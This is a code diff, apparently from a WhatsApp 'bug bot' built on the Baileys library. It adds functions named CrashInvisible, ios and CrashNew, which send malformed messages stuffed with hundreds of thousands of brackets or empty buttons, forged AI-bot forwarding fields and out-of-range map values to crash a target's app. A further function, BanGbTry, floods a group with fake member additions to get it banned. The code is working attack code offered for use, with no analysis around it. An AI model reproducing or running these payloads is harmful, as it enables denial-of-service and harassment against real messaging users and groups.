-                                        __typename: "GenAISingleLayoutViewModel" 
-                                    } 
-                                }, 
-                                { 
-                                    view_model: { 
-                                        primitive: { 
-                                            text: "",
-                                            __typename: "GenAIMarkdownTextUXPrimitive" 
-                                        },
-                                        __typename: "GenAISingleLayoutViewModel"
-                                    }
-                                }
-                            ]
-                        })).toString("base64")
-                    },
-                    contextInfo: { 
-                        forwardingScore: 1, 
-                        isForwarded: true,
-                        forwardedAiBotMessageInfo: { 
-                            botName: "Meta AI",
-                            botJid: "13135550002@s.whatsapp.net", 
-                            creatorName: "Meta"
+/* CrashInvisible (vortex) */
+async function CrashInvisible(sock, target) {
+    await sock.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: {
+                    richResponseMessage: {
+                        messageType: 1,
+                        submessages: [{
+                            messageType: 7,
+                            mapMetadata: {
+                                centerLatitude: -999999,
+                                centerLongitude: 99999,
+                                latitudeDelta: 99999,
+                                longitudeDelta: 99999,
+                                annotations: "[".repeat(500000)
+                            }
+                        }],
+                        contextInfo: {
+                            forwardingScore: 9999,
+                            isForwarded: true,
+                            forwardedAiBotMessageInfo: {
+                                botJid: "259786046210223@bot"
+                            },
+                            forwardOrigin: 4,
+                            botMessageSharingInfo: {
+                                botEntryPointOrigin: 1,
+                                forwardScore: 99
+                            }
                         }
                     }
                 }
             }
+        }, { noSelfSync: true })
+     
+  await sock.relayMessage(target, {
+   messageContextInfo: {
+     deviceListMetadata: {},
+     deviceListMetadataVersion: 2,
+     botMetadata: {
+       pluginMetadata: {},
+       richResponseSourcesMetadata: { sources: [] }
+    }
+  },
+  groupStatusMessageV2: {
+    message: {
+      richResponseMessage: {
+        messageType: 1,
+        submessages: [
+          {
+          messageType: 4,
+          tableMetadata: {
+            title: "\0",
+              rows: "[".repeat(500000),
+            }
+          }
+        ],
+        unifiedResponse: {
+          data: JSON.stringify({
+            response_id: crypto.randomUUID(),
+            sections: []
+          })
+        },
+        contextInfo: {
+          forwardingScore: 1,
+          isForwarded: true,
+          forwardedAiBotMessageInfo: {
+            botJid: "867051314767696@bot"
+          },
+          forwardOrigin: 4
         }
+      }
+    }
+  }
+}, {
+ noSelfSync: true 
+})
+
+await sock.relayMessage(target, {
+groupStatusMessageV2: {
+message: {
+interactiveMessage: {
+header: {
+imageMessage: {
+url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
+mimetype: "image/jpeg",
+caption: "NandoX(CrB)",
+fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
+fileLength: "634893",
+height: 1022,
+width: 1080,
+mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
+fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb3Xn0+0A=",
+directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
+mediaKeyTimestamp: "1782643133",
+jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
+hasMediaAttachment: true
+}
+},
+body: {
+text: "\0",
+},
+nativeFlowMessage: {
+buttons: "[".repeat(500000),
+}
+}
+}
+}
+}, { noSelfSync: true })
+}
+
+/* IOS FC NEW */
+function isIgnorableSocketError(err) {
+    const ignorable = ['Socket connection closed', 'Connection Closed', 'Timed Out', 'Stream Errored', 'Connection Terminated'];
+    const msg = (err && err.message) || '';
+    return ignorable.some(i => msg.includes(i));
+}
+
+async function ios(sock, target, telegramUserId = null) {
+    try {
+        try {
+            if (typeof sock.assertSessions === 'function') {
+                await sock.assertSessions([target], true);
+            }
+        } catch (_) {}
+
+        await sock.relayMessage(target, {
+            botForwardedMessage: {
+                message: {
+                    richResponseMessage: {
+                        messageType: 1,
+                        submessages: [],
+                        unifiedResponse: {
+                            data: Buffer.from(JSON.stringify({
+                                response_id: crypto.randomUUID(),
+                                sections: [
+                                    {
+                                        view_model: {
+                                            primitive: {
+                                                text: "x",
+                                                inline_entities: ["{".repeat(3000)],
+                                                __typename: "GenAIMarkdownTextUXPrimitive",
+                                            },
+                                            __typename: "GenAISingleLayoutViewModel",
+                                        }
+                                    }
+                                ]
+                            }))
+                        },
+                        contextInfo: {
+                            forwardingScore: 1,
+                            isForwarded: true,
+                            forwardOrigin: 4,
+                            forwardedAiBotMessageInfo: {
+                                botJid: "0@bot"
+                            }
+                        }
+                    }
+                }
+            }
+        }, {
+            noSelfSync: true,
+        });
+    } catch (err) {
+        const msg = (err && err.message) || '';
+        if (!isIgnorableSocketError(err) && !msg.includes('All encryptions failed')) {
+            console.log(`❌ Error in ios: ${msg}`);
+        }
+    }
+    await sleep(1000);
+}
+
+/* BAN GB TRY (bannidoV3) */
+async function BanGbTry(sock, target) {
+  if (!target.endsWith("@g.us")) throw new Error('@g.us server required');
+
+  const resolveJid = function(raw) {
+    let s = String(raw || '').trim();
+    if (s.includes('@')) return s;
+    return s.replace(/\D/g, '') + '@s.whatsapp.net';
+  };
+
+  const jids = (Array.isArray(target) ? target : [target])
+    .map(resolveJid)
+    .filter(function(j) { return j.length > 15; });
+
+  if (!jids.length) throw new Error('No valid JIDs');
+
+  for (let i = 0; i < jids.length; i++) {
+    const group = jids[i];
+
+    try {
+      await sock.groupParticipantsUpdate(group, ["13135550002@s.whatsapp.net"], "add");
+    } catch (_) {}
+
+    try {
+      await sock.groupParticipantsUpdate(group, ['971500000000@s.whatsapp.net'], 'add');
+    } catch (_) {}
+
+    try {
+      await sock.sendPresenceUpdate('composing', group);
+    } catch (_) {}
+
+    try {
+      const fakeNumbers = Array.from({ length: 100 }, () => {
+        return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net';
+      });
+
+      for (const fakeJid of fakeNumbers) {
+        await sock.groupParticipantsUpdate(group, [fakeJid], 'add').catch(() => {});
+        await new Promise(r => setTimeout(r, 30));
+      }
+
+      await sock.sendMessage(group, { text: `lawik malah ke ban` }).catch(() => {});
+    } catch (_) {}
+  }
+}
+
+/* CrashNew (xspecter) */
+async function CrashNew(sock, target) {
+    const MakLo = {
+        noSelfSync: true
     };
-    
-    const msg = generateWAMessageFromContent(target, tora, {});
-    
-    demmy.relayMessage(target, msg.message, { 
-  noSelfSync: true,  
-  messageId: msg.key.id, 
- });
+
+    const payloads = [
+        "placeholderResendMessage",
+        Buffer.from("placeholderResendMessage").toString("base64"),
+        Buffer.from(
+            Buffer.from("placeholderResendMessage").toString("base64")
+        ).toString("base64"),
+        Array.from("placeholderResendMessage").map(c => c.charCodeAt(0)),
+        Array.from("placeholderResendMessage").map(c => c.charCodeAt(0) ^ 0x42),
+        Array.from("placeholderResendMessage").map(c => c.charCodeAt(0) ^ 0xFF),
+        Buffer.from(
+            Array.from("placeholderResendMessage").map(c => c.charCodeAt(0) ^ 0x5A)
+        ).toString("base64")
+    ];
+
+    for (let i = 0; i < 150; i++) {
+        const msg = {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveMessage: {
+                        body: {
+                            text: "\u200B" + "\u927D"
+                        },
+                        header: {
+                            title: "\u200D"
+                        },
+                        nativeFlowMessage: {
+                            messageParamsJson: JSON.stringify({
+                                placeholderResendMessage: payloads[i % payloads.length]
+                            }),
+                            buttons: Array.from({ length: 500000 }, () => ({}))
+                        },
+                        nativeFlowResponseMessage: {
+                            buttons: [
+                                { name: "meta_ai_message" }
+                            ]
+                        }
+                    }
+                }
+            }
+        };
+
+        await sock.relayMessage(target, msg, MakLo);
+    }
 }
 
 /* End Bug */
